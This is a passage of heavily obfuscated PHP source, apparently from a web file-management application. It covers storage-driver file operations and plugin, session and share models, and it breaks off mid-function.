public function info($¡øÂ¬‰) { return $this->infoParse($¡øÂ¬‰); } public function infoAuth($õ†£Ï÷½) { return $this->infoParse($õ†£Ï÷½, !1, !0); } public function infoWithChildren($¬ÂÅêı¹) { return $this->infoParse($¬ÂÅêı¹, !0); } protected function infoParse($ûŒ†¸åô, $™Ãó˜× = false, $¾¬Æ‡ºÈ = false) { if (!$™Ãó˜×) { return $this->model->pathInfo($ûŒ†¸åô, $¾¬Æ‡ºÈ); } return $this->model->pathInfoMore($ûŒ†¸åô); } public function infoFull($Ìä¬„Ã ) { $ÜÙ¸Éª  =& $_SERVER[şÒÁøÒÄ]; $»¤·£ä = explode($ÜÙ¸Éª [8], $Ìä¬„Ã ); $Á•ˆûøº = implode($ÜÙ¸Éª [8], array_splice($»¤·£ä, 1)); return $this->model->pathInfoByPath($»¤·£ä[0], $Á•ˆûøº); } public function hashSimple($ì¬ŠÖ°Š) { $ÓÍîÅÉ£ =& $_SERVER[şÒÁøÒÄ]; $ÛõòïíÊ = $this->infoWithChildren($ì¬ŠÖ°Š); return $ÛõòïíÊ[$ÓÍîÅÉ£[170]][$ÓÍîÅÉ£[177]]; } public function hashMd5($à—íØ“) { $ìÆ­İõË =& $_SERVER[şÒÁøÒÄ]; $´äÀ’…Ÿ = $this->infoWithChildren($à—íØ“); return $´äÀ’…Ÿ[$ìÆ­İõË[170]][$ìÆ­İõË[176]]; } public function exist($Ï‘¼…³) { $§§ÁşÌ =& $_SERVER[şÒÁøÒÄ]; $üóØ±èÕ = $this->parse($Ï‘¼…³); if (!$üóØ±èÕ[$§§ÁşÌ[84]]) { return $this->isFile($Ï‘¼…³) || $this->isFolder($Ï‘¼…³); } $£ú¬’Š = array($§§ÁşÌ[401] => $üóØ±èÕ[$§§ÁşÌ[399]], $§§ÁşÌ[32] => $üóØ±èÕ[$§§ÁşÌ[84]]); $•’ú®±İ = $this->model->where($£ú¬’Š)->find(); return $•’ú®±İ ? !0 : !1; } public function isFile($ŸìÆÅ“Ä) { $Ğ³³ı Ğ =& $_SERVER[şÒÁøÒÄ]; $ó¬şõÌ = $this->infoSimple($ŸìÆÅ“Ä); return $ó¬şõÌ && $ó¬şõÌ[$Ğ³³ı Ğ[410]] == $Ğ³³ı Ğ[88] ? !1 : !0; } public function isFolder($›†¨€Ã) { $‚ë»Ó† =& $_SERVER[şÒÁøÒÄ]; $˜û…ü›« = $this->infoSimple($›†¨€Ã); return $˜û…ü›« && $˜û…ü›«[$‚ë»Ó†[410]] == $‚ë»Ó†[88] ? !0 : !1; } public function listPath($‚¾¥¬¥», $™³É¦•ú = false) { $ÆÀèğ¾„ =& $_SERVER[şÒÁøÒÄ]; if ($‚¾¥¬¥» == $ÆÀèğ¾„[12]) { return !1; } $Ö•½Ù = array($ÆÀèğ¾„[401] => $‚¾¥¬¥»); if ($™³É¦•ú) { return $this->model->listSource($Ö•½Ù, -1); } return $this->model->listSource($Ö•½Ù); } public function has($í‘Ÿµ³÷, $öå¥àÈ¦ = false, $å×ùœâÕ = null) { $“Î­Óµı =& $_SERVER[şÒÁøÒÄ]; $»™çÛ¼ = $this->infoWithChildren($í‘Ÿµ³÷); if ($öå¥àÈ¦) { return array($“Î­Óµı[208] => $»™çÛ¼[$“Î­Óµı[208]], $“Î­Óµı[207] => $»™çÛ¼[$“Î­Óµı[207]]); } return $å×ùœâÕ ? $»™çÛ¼[$“Î­Óµı[208]] : $»™çÛ¼[$“Î­Óµı[207]]; } public function listAll($Šª¹¼î¡) { $ò»±åÚ¶ = IO::info($this->pathParse[$_SERVER[şÒÁøÒÄ][84]]); if (!$ò»±åÚ¶) { return array(); } return $this->model->listAll($Šª¹¼î¡); } public function getContent($‡à˜­î¦) { return $this->model->getContent($‡à˜­î¦); } public function setContent($È‹³ŞƒÍ, $§”¡ŠŸ¨ = '') { return $this->model->setContent($È‹³ŞƒÍ, $§”¡ŠŸ¨); } public function fileSubstr($»àÛ®‰û, $İ‚øò¢, $³¼¢ÔªÈ) { return $this->model->fileSubstr($»àÛ®‰û, $İ‚øò¢, $³¼¢ÔªÈ); } public function download($äè¹Šûñ, $İĞ¬‹è× = '') { $úÀéöË = get_path_father($İĞ¬‹è×); $·®şµ®§ = get_path_this($İĞ¬‹è×); $×ìÙÀ·ô = $this->model->fileInfoGet($äè¹Šûñ); $³¤ä®õ– = IO::copy($×ìÙÀ·ô[$_SERVER[şÒÁøÒÄ][84]], $úÀéöË, !1, $·®şµ®§); return $³¤ä®õ–; } public function setModifyTime($‰ïéÀõ©, $½ÊÚ„ì = '') { $¸ÙÚä¬ƒ =& $_SERVER[şÒÁøÒÄ]; if (!$‰ïéÀõ©) { return; } $this->model->where(array($¸ÙÚä¬ƒ[417] => $‰ïéÀõ©))->save(array($¸ÙÚä¬ƒ[85] => $½ÊÚ„ì)); } public function upload($şÙŞ²ğ, $ï ¶¾Òú, $µ¦Ô™¿¾ = false, $™³œ”ØÜ = REPEAT_REPLACE) { $ÇÄıˆ»ü =& $_SERVER[şÒÁøÒÄ]; $µµÉì¾ = $this->parse($şÙŞ²ğ); $öË¥×áà = $this->model->addFile($µµÉì¾[$ÇÄıˆ»ü[399]], $ï ¶¾Òú, $µµÉì¾[$ÇÄıˆ»ü[84]], $µ¦Ô™¿¾, $™³œ”ØÜ); return $this->getPathOuter($öË¥×áà); } public function uploadFileByID($è—ãÃ§, $îîÕÓ Å, $ ËãÄÅ) { $™—÷¡Ï‰ =& $_SERVER[şÒÁøÒÄ]; $ÙÀÛ£ñ = $this->parse($è—ãÃ§); $²ÖŞäÅç = $this->model->addFileByFileID($ÙÀÛ£ñ[$™—÷¡Ï‰[399]], $îîÕÓ Å, $ÙÀÛ£ñ[$™—÷¡Ï‰[84]], $ ËãÄÅ); return $this->getPathOuter($²ÖŞäÅç); } public function addFileByRemote($öŠ“Í§Ø, $¹®½À¯Æ, $şÜç´äî = array(), $‡ìÁŒ» = '', $•üˆëå×) { $Œô×„üŒ =& $_SERVER[şÒÁøÒÄ]; $¢ü“çßÕ = $this->parse($öŠ“Í§Ø); $‡ìÁŒ» = empty($‡ìÁŒ») ? $¢ü“çßÕ[$Œô×„üŒ[84]] : $‡ìÁŒ»; $ñĞ€õİ­ = $this->model->addFileByRemote($¢ü“çßÕ[$Œô×„üŒ[399]], $¹®½À¯Æ, $‡ìÁŒ», $şÜç´äî, $•üˆëå×); return $this->getPathOuter($ñĞ€õİ­); } public function uploadLink($äú©æÉÍ, $ÚÃãÁÇÅ = 0) { $ßš«©¨ñ =& $_SERVER[şÒÁøÒÄ]; $ØÀéşü£ = $this->parse($äú©æÉÍ); $Ñ´÷®£ô = _get($GLOBALS[$ßš«©¨ñ[7]], $ßš«©¨ñ[1354]); $À¨Ê©Â° = _get($GLOBALS[$ßš«©¨ñ[7]], $ßš«©¨ñ[1355]); $äú©æÉÍ = Model($ßš«©¨ñ[601])->createFileName($ØÀéşü£[$ßš«©¨ñ[84]], $Ñ´÷®£ô, $À¨Ê©Â°); return IO::uploadLink($äú©æÉÍ, $ÚÃãÁÇÅ); } public function fileNameAuto($¥öŠ¸³, $‘’òò£, $¶…×Ùé = REPEAT_REPLACE, $ºˆŠ«ãì = false) { return $this->model->fileNameAuto($¥öŠ¸³, $‘’òò£, $¶…×Ùé, $ºˆŠ«ãì); } public function fileNameExist($ÖµÒ¤Ï‰, $š’µ‰Æê) { return $this->model->fileNameExist($ÖµÒ¤Ï‰, $š’µ‰Æê); } protected function _fileOut($´áÏ’”â, $Ş®êÂ´ø = false, $ÉÈ¾Á®© = false, $öÂº¡œ¡ = '', $ïìÏÃ = false) { $¦¥µ—Ù =& $_SERVER[şÒÁøÒÄ]; $îšğ³Üõ = $this->model->sourceInfo($´áÏ’”â); if ($îšğ³Üõ[$¦¥µ—Ù[410]] == $¦¥µ—Ù[88]) { header($¦¥µ—Ù[1356]); die; } $èøõÎß° = $this->model->fileInfoGet($´áÏ’”â); $öÂº¡œ¡ = $èøõÎß°[$¦¥µ—Ù[176]] ? $èøõÎß°[$¦¥µ—Ù[176]] : $öÂº¡œ¡; $ö…ú€ = isset($GLOBALS[$¦¥µ—Ù[1357]]) ? $GLOBALS[$¦¥µ—Ù[1357]] : $îšğ³Üõ[$¦¥µ—Ù[32]]; if ($ïìÏÃ) { return IO::fileOutServer($èøõÎß°[$¦¥µ—Ù[84]], $Ş®êÂ´ø, $ö…ú€, $öÂº¡œ¡); } IO::fileOut($èøõÎß°[$¦¥µ—Ù[84]], $Ş®êÂ´ø, $ö…ú€, $öÂº¡œ¡); } public function fileOut($íè³ø§Ş, $±ìÜî±î = false, $ğ­ö°ü = false, $Çòıæıô = '') { $this->_fileOut($íè³ø§Ş, $±ìÜî±î, $ğ­ö°ü, $Çòıæıô); } public function fileOutServer($¡ûÕÔŸ, $¥¯ñŸËÜ = false, $¶ˆœ±Ëô = false, $¤ùïôÛÌ = '') { $this->_fileOut($¡ûÕÔŸ, $¥¯ñŸËÜ, $¶ˆœ±Ëô, $¤ùïôÛÌ, !0); } protected function _fileOutImage($°¾ú‹±Ê, $ä÷Ñ°Á = 250) { $ªÄ·‘õÇ =& $_SERVER[şÒÁøÒÄ]; $ã ºéÂè = $this->model->pathInfo($°¾ú‹±Ê); if ($ã ºéÂè[$ªÄ·‘õÇ[410]] == $ªÄ·‘õÇ[88]) { show_json($ªÄ·‘õÇ[1358] . $°¾ú‹±Ê, !1); } $áÎ°ÓÇï = $this->model->fileInfoGet($°¾ú‹±Ê); $áÎ°ÓÇï[$ªÄ·‘õÇ[32]] = $ã ºéÂè[$ªÄ·‘õÇ[32]]; $áÎ°ÓÇï[$ªÄ·‘õÇ[169]] = $ã ºéÂè[$ªÄ·‘õÇ[169]]; $GLOBALS[$ªÄ·‘õÇ[1357]] = $áÎ°ÓÇï[$ªÄ·‘õÇ[32]]; $GLOBALS[$ªÄ·‘õÇ[168]] = $áÎ°ÓÇï; IO::fileOutImage($áÎ°ÓÇï[$ªÄ·‘õÇ[84]], $ä÷Ñ°Á); } public function fileOutImage($åÒì÷½Ç, $Éåº×ñœ = 250) { $this->_fileOutImage($åÒì÷½Ç, $Éåº×ñœ); } public function fileOutImageServer($üÙôÉİ×, $İëÕŒæ¡ = 250) { $this->_fileOutImage($üÙôÉİ×, $İëÕŒæ¡); } public function link($ªÈàº º, $½üÆ×ú³ = '') { $Ì·™Õà² = $this->model->fileInfoGet($ªÈàº º); return IO::link($Ì·™Õà²[$_SERVER[şÒÁøÒÄ][84]], $½üÆ×ú³); } protected function parse($ğ¦•ûúş) { $Ë†ï€ê‘ =& $_SERVER[şÒÁøÒÄ]; if (strstr($ğ¦•ûúş, $Ë†ï€ê‘[8]) === !1) { return array($Ë†ï€ê‘[419] => intval($ğ¦•ûúş), $Ë†ï€ê‘[84] => $Ë†ï€ê‘[12], $Ë†ï€ê‘[1353] => array()); } $‘ÃÛ´ô = explode($Ë†ï€ê‘[8], trim($ğ¦•ûúş, $Ë†ï€ê‘[8])); if (count($‘ÃÛ´ô) < 2) { show_tips(clear_html($ğ¦•ûúş) . $Ë†ï€ê‘[1359]); } return array($Ë†ï€ê‘[419] => intval($‘ÃÛ´ô[0]), $Ë†ï€ê‘[84] => $‘ÃÛ´ô[1], $Ë†ï€ê‘[1353] => array_slice($‘ÃÛ´ô, 1)); } } goto f¦êâöŞµ¯; Eƒ‹ÅöÛŞõ: class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\x2e\160\154\165\147\x69\156\x4c\x69\163\x74"; public $field = array("\x6e\x61\155\145", "\x73\x74\141\x74\x75\x73", "\162\145\x67\x69\x65\163\164", "\x63\x6f\156\146\x69\x67"); public function loadList($ÍÜ“ƒÊí = false) { $µæ™şÑÀ = array_to_keyvalue($this->listData(), $_SERVER[şÒÁøÒÄ][32]); if ($ÍÜ“ƒÊí) { return $µæ™şÑÀ[$ÍÜ“ƒÊí]; } return $µæ™şÑÀ; } public function init() { $Ê‘ÁÙÊº =& $_SERVER[şÒÁøÒÄ]; Hook::trigger($Ê‘ÁÙÊº[1989]); $Ù¤ÏÕØÊ = $this->loadPluginList(); foreach ($Ù¤ÏÕØÊ as $¯£ó‰ğ½ => $Ó”÷ĞÖ˜) { $ëºÀá¯¢ = $this->appAllow($¯£ó‰ğ½, $Ó”÷ĞÖ˜); if (!$ëºÀá¯¢) { continue; } foreach ($Ó”÷ĞÖ˜[$Ê‘ÁÙÊº[1990]] as $¨ŒÛûÂ => $»üÒ¬Î¹) { Hook::bind($¨ŒÛûÂ, $»üÒ¬Î¹); } } Hook::trigger($Ê‘ÁÙÊº[1991]); Hook::trigger(ACTION); } public function appAllow($ı¿İÔ¾“, $¬âÖª¹”, $ÂÂ«»»… = true) { $ëŠæÖÅ =& $_SERVER[şÒÁøÒÄ]; $ëÓ‚±Ø½ = PLUGIN_DIR . $ı¿İÔ¾“ . $ëŠæÖÅ[1992]; if (!is_array($¬âÖª¹”) || !is_array($¬âÖª¹”[$ëŠæÖÅ[1990]]) || $¬âÖª¹”[$ëŠæÖÅ[757]] != 1 || !is_file($ëÓ‚±Ø½)) { return !1; } if ($GLOBALS[$ëŠæÖÅ[494]] == 1) { if ($GLOBALS[$ëŠæÖÅ[6]][$ëŠæÖÅ[1993]] || !$GLOBALS[$ëŠæÖÅ[6]][$ëŠæÖÅ[1994]]) { return !0; } $‚ö´ÙÏ = explode($ëŠæÖÅ[50], strtolower($GLOBALS[$ëŠæÖÅ[6]][$ëŠæÖÅ[1994]])); return in_array(strtolower($ı¿İÔ¾“), $‚ö´ÙÏ) ? !1 : !0; } if ($ÂÂ«»»… && !Action($ëŠæÖÅ[1995])->checkAuth($ı¿İÔ¾“)) { return !1; } return !0; } public function unInstall($íâºĞ™È) { $¦şÕ”“ =& $_SERVER[şÒÁøÒÄ]; $©ô«°‡¦ = $this->loadList($íâºĞ™È); if (file_exists(PLUGIN_DIR . $íâºĞ™È)) { Hook::apply($íâºĞ™È . $¦şÕ”“[1996]); } $this->remove($©ô«°‡¦[$¦şÕ”“[399]]); } public function changeStatus($ÚÍ®¨¯ß, $¤É“Š¾‘) { $Úº™ÛÖ =& $_SERVER[şÒÁøÒÄ]; $ñç¦Ø„á = $this->loadList($ÚÍ®¨¯ß); if ($¤É“Š¾‘) { Hook::apply($ÚÍ®¨¯ß . $Úº™ÛÖ[1997]); } $this->update($ñç¦Ø„á[$Úº™ÛÖ[399]], array($Úº™ÛÖ[1998] => $¤É“Š¾‘)); } public function appRegist($¶º¦ö›‘, $ôºİö») { $çµ¡¦îô =& $_SERVER[şÒÁøÒÄ]; $ƒÒŸ˜èç = $this->loadList($¶º¦ö›‘); if ($ƒÒŸ˜èç) { $this->update($ƒÒŸ˜èç[$çµ¡¦îô[399]], array($çµ¡¦îô[1990] => $ôºİö»)); } else { $œ¨¢Ûùæ = array($çµ¡¦îô[32] => $¶º¦ö›‘, $çµ¡¦îô[1990] => $ôºİö», $çµ¡¦îô[757] => 0, $çµ¡¦îô[6] => $this->getConfigDefault($¶º¦ö›‘)); $this->insert($œ¨¢Ûùæ); } } public function getConfigDefault($ÁÃ—ÀÁ„) { $Õá÷¸ô =& $_SERVER[şÒÁøÒÄ]; $ãúŒ¢ìˆ = array(); $ÒòÃØ­ = $this->getPackageJson($ÁÃ—ÀÁ„); if (!$ÒòÃØ­ && is_array($ÒòÃØ­[$Õá÷¸ô[1999]])) { return $ãúŒ¢ìˆ; } foreach ($ÒòÃØ­[$Õá÷¸ô[1999]] as $éåÌˆéï => $Ï¾ªÖÍõ) { if (!isset($Ï¾ªÖÍõ[$Õá÷¸ô[374]]) || isset($ãúŒ¢ìˆ[$éåÌˆéï])) { continue; } $ãúŒ¢ìˆ[$éåÌˆéï] = $Ï¾ªÖÍõ[$Õá÷¸ô[374]]; } return $ãúŒ¢ìˆ; } public function getPackageJson($•ìëÕô¾) { return Hook::apply($•ìëÕô¾ . $_SERVER[şÒÁøÒÄ][2000]); } public function getConfig($ß¯‚ŸüÏ, $ôÒÈø­  = false) { $¼üÁÁò =& $_SERVER[şÒÁøÒÄ]; $È¯àÎğ = array(); $´ù¢Í“ = $this->loadList($ß¯‚ŸüÏ); if ($´ù¢Í“ && is_array($´ù¢Í“[$¼üÁÁò[6]])) { $È¯àÎğ = $´ù¢Í“[$¼üÁÁò[6]]; } if (!$È¯àÎğ || $ôÒÈø­ ) { $È¯àÎğ = $this->getConfigDefault($ß¯‚ŸüÏ); } return $È¯àÎğ; } public function setConfig($¶»­¸ÚÏ, $Ïî ÄÙ = false) { $ó˜Ûş«š =& $_SERVER[şÒÁøÒÄ]; $¯ºñóğÈ = $this->loadList($¶»­¸ÚÏ); if (!$¯ºñóğÈ) { return !1; } $Æ÷‡Ÿß = $¯ºñóğÈ[$ó˜Ûş«š[6]]; if ($Ïî ÄÙ == !1) { $Æ÷‡Ÿß = array(); $Ïî ÄÙ = $this->getConfigDefault($¶»­¸ÚÏ); } foreach ($Ïî ÄÙ as $ë–®õ¾ => $Õ‰ğ÷ùâ) { $Æ÷‡Ÿß[$ë–®õ¾] = is_string($Õ‰ğ÷ùâ) ? trim($Õ‰ğ÷ùâ) : $Õ‰ğ÷ùâ; } $this->update($¯ºñóğÈ[$ó˜Ûş«š[399]], array($ó˜Ûş«š[6] => $Æ÷‡Ÿß)); } public function viewList() { $ŒŞ•‰ =& $_SERVER[şÒÁøÒÄ]; $İõãŠŸ = $this->loadList(); $this->pluginScan($İõãŠŸ); $İõãŠŸ = $this->loadPluginList(); $ŸáœİæÏ = array(); foreach ($İõãŠŸ as $×÷šêş => $²ÈÍĞí±) { unset($²ÈÍĞí±[$ŒŞ•‰[1990]], $²ÈÍĞí±[$ŒŞ•‰[6]]); $÷™ñê¼ = PLUGIN_DIR . $²ÈÍĞí±[$ŒŞ•‰[32]] . $ŒŞ•‰[1992]; if (!is_file($÷™ñê¼)) { continue; } $ôö¸Ù‡ğ = Hook::apply($²ÈÍĞí±[$ŒŞ•‰[32]] . $ŒŞ•‰[2000]); if (is_array($ôö¸Ù‡ğ)) { $ŸáœİæÏ[$×÷šêş] = array_merge($²ÈÍĞí±, $ôö¸Ù‡ğ); } } return $ŸáœİæÏ; } private function loadPluginList() { $äïìÜÃ =& $_SERVER[şÒÁøÒÄ]; $·óªÓ‚ó = $this->loadList(); if (strtolower(MOD) == $äïìÜÃ[2001]) { return $·óªÓ‚ó; } $î×ó“øç = Hook::trigger($äïìÜÃ[2002], $·óªÓ‚ó); if ($·óªÓ‚ó && !$î×ó“øç) { die; } return $î×ó“øç ? $î×ó“øç : $·óªÓ‚ó; } private function pluginScan($¸ÅÒöÑ) { $í‚·Ö–‘ =& $_SERVER[şÒÁøÒÄ]; recursion_dir(PLUGIN_DIR, $Óß¨¬€, $è¶ã”íğ, 0); foreach ($Óß¨¬€ as $ã¾şÅé½) { $É‹¦ØÍŞ = get_path_this($ã¾şÅé½); if (isset($¸ÅÒöÑ[$É‹¦ØÍŞ]) || !file_exists($ã¾şÅé½ . $í‚·Ö–‘[2003]) || !file_exists($ã¾şÅé½ . $í‚·Ö–‘[1992])) { continue; } Hook::apply($É‹¦ØÍŞ . $í‚·Ö–‘[1997]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\x74\145\155\137\163\x65\163\x73\151\x6f\156"; public function get($…£¸†) { $ÖŞğÓ—÷ =& $_SERVER[şÒÁøÒÄ]; $”ÍéşÀƒ = $this->where(array($ÖŞğÓ—÷[2004] => $…£¸†))->find(); if (!is_array($”ÍéşÀƒ)) { return !1; } return $”ÍéşÀƒ[$ÖŞğÓ—÷[762]]; } public function set($×œÔİˆü, $…©ˆ«É, $ÔÛŞÒÉø = 3600) { $›Ä©´°£ =& $_SERVER[şÒÁøÒÄ]; $ìÇ‹¬öğ = array($›Ä©´°£[2004] => $×œÔİˆü, $›Ä©´°£[1908] => $…©ˆ«É, $›Ä©´°£[2005] => $ÔÛŞÒÉø + time()); if (Session::get($›Ä©´°£[2006])) { $ìÇ‹¬öğ[$›Ä©´°£[1680]] = Session::get($›Ä©´°£[2006]); } else { $ìÇ‹¬öğ[$›Ä©´°£[1680]] = 0; } if ($this->get($×œÔİˆü)) { return $this->where(array($›Ä©´°£[2004] => $×œÔİˆü))->save($ìÇ‹¬öğ); } else { return $this->add($ìÇ‹¬öğ, array(), !0); } } public function remove($Ø–íò) { return $this->where(array($_SERVER[şÒÁøÒÄ][2004] => $Ø–íò))->delete(); } public function clearTimeout() { return $this->where($_SERVER[şÒÁøÒÄ][2007] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\162\145"; protected $dataAuto = array(array("\155\x6f\144\151\x66\171\124\x69\155\145", "\x74\151\155\x65", "\151\156\163\x65\162\x74\x2c\165\160\x64\141\x74\x65", "\146\165\x6e\143\x74\151\x6f\x6e"), array("\x63\162\145\141\x74\145\124\151\155\145", "\x74\151\x6d\145", "\151\156\x73\145\162\164", "\146\165\156\x63\164\x69\x6f\x6e"), array("\157\x70\x74\151\x6f\x6e\163", '', "\151\x6e\x73\145\162\x74\54\x75\x70\x64\x61\x74\x65\54\x73\x65\154\x65\x63\164", "\152\163\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($Î¡ïŠ¬È) { $±Â»€âÖ =& $_SERVER[şÒÁøÒÄ]; $ËäÊà”Ô = isset($Î¡ïŠ¬È[0]) ? $Î¡ïŠ¬È[0] : !1; return array($±Â»€âÖ[2008] => array(USER_ID, $±Â»€âÖ[2009]), $±Â»€âÖ[1949] => array($ËäÊà”Ô, $±Â»€âÖ[2010])); } protected function listSimple() { $«è­ñÀ• = array($_SERVER[şÒÁøÒÄ][1680] => USER_ID); $³ù¦¦°¾ = $this->field($this->fieldList)->where($«è­ñÀ•)->select(); return $³ù¦¦°¾ ? $³ù¦¦°¾ : array(); } protected function getInfo($Òº«Íåä, $©øÈ» = false) { $„ç¸ı =& $_SERVER[şÒÁøÒÄ]; if ($©øÈ») { return $this->_getShareInfo(array($„ç¸ı[593] => $Òº«Íåä)); } $¬åš•ÜÈ = $this->cacheFunctionGet($„ç¸ı[1951], $Òº«Íåä); return $¬åš•ÜÈ; } public function getInfoByHash($á·¬œ‰) { return $this->_getShareInfo(array($_SERVER[şÒÁøÒÄ][2011] => $á·¬œ‰)); } public function getInfoByPath($„ßğŠÈ) { $İÎÙ´×È =& $_SERVER[şÒÁøÒÄ]; $Æ‰…ÔÙ = array($İÎÙ´×È[1680] => USER_ID, $İÎÙ´×È[402] => $„ßğŠÈ); return $this->_getShareInfo($Æ‰…ÔÙ); } public function getInfoBySourcePath($Ÿ›È×ÚÁ) { $éäÉùÏ =& $_SERVER[şÒÁøÒÄ]; $ş›ºËê» = array($éäÉùÏ[1680] => USER_ID, $éäÉùÏ[1188] => $Ÿ›È×ÚÁ); return $this->_getShareInfo($ş›ºËê»); } private function _getShareInfo($éı°ßÕ£) { $¸Íéß‚Ç =& $_SERVER[şÒÁøÒÄ]; $•Ë¶¸…ç = $this->where($éı°ßÕ£)->find(); if (!$•Ë¶¸…ç) { return !1; } $éı°ßÕ£ = array($¸Íéß‚Ç[593] => $•Ë¶¸…ç[$¸Íéß‚Ç[593]]); $õéÉ¿Íé = $¸Íéß‚Ç[2012]; $—Çğ‹¦ï = Model($¸Íéß‚Ç[594])->order($¸Íéß‚Ç[399])->field($õéÉ¿Íé)->where($éı°ßÕ£)->select(); if ($•Ë¶¸…ç[$¸Íéß‚Ç[402]] == $¸Íéß‚Ç[198]) { $•Ë¶¸…ç[$¸Íéß‚Ç[87]] = IO::info($•Ë¶¸…ç[$¸Íéß‚Ç[1188]]); } else { $•Ë¶¸…ç[$¸Íéß‚Ç[87]] = Model($¸Íéß‚Ç[1352])->pathInfo($•Ë¶¸…ç[$¸Íéß‚Ç[402]]); } $•Ë¶¸…ç[$¸Íéß‚Ç[2013]] = $—Çğ‹¦ï; return $•Ë¶¸…ç; } protected function getInfoAuth($•¤’) { $áÙÀè¨ı =& $_SERVER[şÒÁøÒÄ]; $õÑÁ–Å = $this->getInfo($•¤’); if ($õÑÁ–Å[$áÙÀè¨ı[1680]] == USER_ID) { $õÑÁ–Å[$áÙÀè¨ı[413]] = $õÑÁ–Å[$áÙÀè¨ı[87]][$áÙÀè¨ı[413]]; } else { $õÑÁ–Å[$áÙÀè¨ı[413]] = Model($áÙÀè¨ı[493])->authMake($õÑÁ–Å[$áÙÀè¨ı[2013]]); } return $õÑÁ–Å; } protected function listData($ë“Ü¢ò“ = null, $Ï÷íÈå = 300) { $ªß‘ŠÑı =& $_SERVER[şÒÁøÒÄ]; $¾Åí¹„Ë = array(array($ªß‘ŠÑı[488] => array($ªß‘ŠÑı[1025], 0), $ªß‘ŠÑı[591] => array($ªß‘ŠÑı[1025], 0), $ªß‘ŠÑı[2014] => $ªß‘ŠÑı[1967])); if ($ë“Ü¢ò“ == $ªß‘ŠÑı[2015]) { $¾Åí¹„Ë = array($ªß‘ŠÑı[488] => 1); } else { if ($ë“Ü¢ò“ == $ªß‘ŠÑı[1174]) { $¾Åí¹„Ë = array($ªß‘ŠÑı[591] => 1); } } $¾Åí¹„Ë[$ªß‘ŠÑı[1680]] = USER_ID; $¼üÃã’ = $this->where($¾Åí¹„Ë)->selectPage($Ï÷íÈå); return $¼üÃã’; } protected function listToMe($Ì×ŠÜõ· = 300) { $’¼ÖïÁë =& $_SERVER[şÒÁøÒÄ]; $­éø—©¯ = Model($’¼ÖïÁë[2016])->userGroupParents(USER_ID); $œæ–“Õ = array($’¼ÖïÁë[576] => SourceModel::TYPE_USER, $’¼ÖïÁë[496] => USER_ID); if ($­éø—©¯) { $œæ–“Õ = array(array($’¼ÖïÁë[576] => SourceModel::TYPE_USER, $’¼ÖïÁë[496] => USER_ID), array($’¼ÖïÁë[576] => SourceModel::TYPE_GROUP, $’¼ÖïÁë[496] => array($’¼ÖïÁë[7], $­éø—©¯)), $’¼ÖïÁë[2014] => $’¼ÖïÁë[1967]); } $º„Û¯…¼ = Model($’¼ÖïÁë[594])->where($œæ–“Õ)->selectPage($Ì×ŠÜõ·); $ú£›ñ = array_to_keyvalue_group($º„Û¯…¼[$’¼ÖïÁë[369]], $’¼ÖïÁë[593]); if (!$ú£›ñ) { return $º„Û¯…¼; } $Ã­Ù“®± = $’¼ÖïÁë[2017]; $œæ–“Õ = array($’¼ÖïÁë[593] => array($’¼ÖïÁë[418], array_keys($ú£›ñ)), $’¼ÖïÁë[1680] => array($’¼ÖïÁë[1027], $’¼ÖïÁë[198])); $×€¼Ú¬Ÿ = $this->field($Ã­Ù“®±)->where($œæ–“Õ)->select(); foreach ($×€¼Ú¬Ÿ as $ËÅŸØ => &$¼Â…) { $¼Â…[$’¼ÖïÁë[2013]] = $ú£›ñ[$¼Â…[$’¼ÖïÁë[593]]]; } unset($¼Â…); $Ô¾“àÍ™ = array($’¼ÖïÁë[2018] => $×€¼Ú¬Ÿ, $’¼ÖïÁë[2019] => $º„Û¯…¼[$’¼ÖïÁë[366]]); return $Ô¾“àÍ™; } protected function shareAdd($µ¦¦æ³¹, $å“€ˆí±) { $×ÙôÎ¯“ =& $_SERVER[şÒÁøÒÄ]; $Ñö…ºñØ = $this->_addShareData($µ¦¦æ³¹, $å“€ˆí±); if (!empty($å“€ˆí±[$×ÙôÎ¯“[2020]])) { $this->_shareAuthSet($Ñö…ºñØ, $å“€ˆí±[$×ÙôÎ¯“[2020]]); } $this->shareEventAdd($µ¦¦æ³¹, $å“€ˆí±, $×ÙôÎ¯“[2021]); return $Ñö…ºñØ; } protected function shareAddSystem($°¡Ï¥íƒ, $Ê‘å¨ÖÛ) { $ì…°êÒî =& $_SERVER[şÒÁøÒÄ]; $¤ûÛ©µ¶ = $this->_addShareData($°¡Ï¥íƒ, $Ê‘å¨ÖÛ, $ì…°êÒî[1297]); $this->_shareAuthSet($¤ûÛ©µ¶, $Ê‘å¨ÖÛ[$ì…°êÒî[2020]]); return $¤ûÛ©µ¶; } private function shareEventAdd($ ïİŸß„, $«Í¦«Áı, $Á˜ıÑ³ó = "\141\144\x64") { $šĞÌŒ•ù =& $_SERVER[şÒÁøÒÄ]; if (!$ ïİŸß„ || $ ïİŸß„ == $šĞÌŒ•ù[198]) { return; } if ($Á˜ıÑ³ó == $šĞÌŒ•ù[2021]) { if ($«Í¦«Áı[$šĞÌŒ•ù[488]] == $šĞÌŒ•ù[88]) { Model($šĞÌŒ•ù[561])->eventShare($ ïİŸß„, $šĞÌŒ•ù[2022]); } if ($«Í¦«Áı[$šĞÌŒ•ù[591]] == $šĞÌŒ•ù[88]) { Model($šĞÌŒ•ù[561])->eventShare($ ïİŸß„, $šĞÌŒ•ù[2023]); } return; } $Èõ…Ëá = $this->getInfoByPath($ ïİŸß„); $éÛïÕ©Ş = $šĞÌŒ•ù[2024]; if ($Èõ…Ëá[$šĞÌŒ•ù[488]] == $šĞÌŒ•ù[198] && $«Í¦«Áı[$šĞÌŒ•ù[488]] == $šĞÌŒ•ù[88]) { $éÛïÕ©Ş = $šĞÌŒ•ù[2022]; } if ($Èõ…Ëá[$šĞÌŒ•ù[488]] == $šĞÌŒ•ù[88] && $«Í¦«Áı[$šĞÌŒ•ù[488]] == $šĞÌŒ•ù[198]) { $éÛïÕ©Ş = $šĞÌŒ•ù[2025]; } if ($Èõ…Ëá[$šĞÌŒ•ù[591]] == $šĞÌŒ•ù[198] && $«Í¦«Áı[$šĞÌŒ•ù[591]] == $šĞÌŒ•ù[88]) { $éÛïÕ©Ş = $šĞÌŒ•ù[2023]; } if ($Èõ…Ëá[$šĞÌŒ•ù[591]] == $šĞÌŒ•ù[88] && $«Í¦«Áı[$šĞÌŒ•ù[591]] == $šĞÌŒ•ù[198]) { $éÛïÕ©Ş = 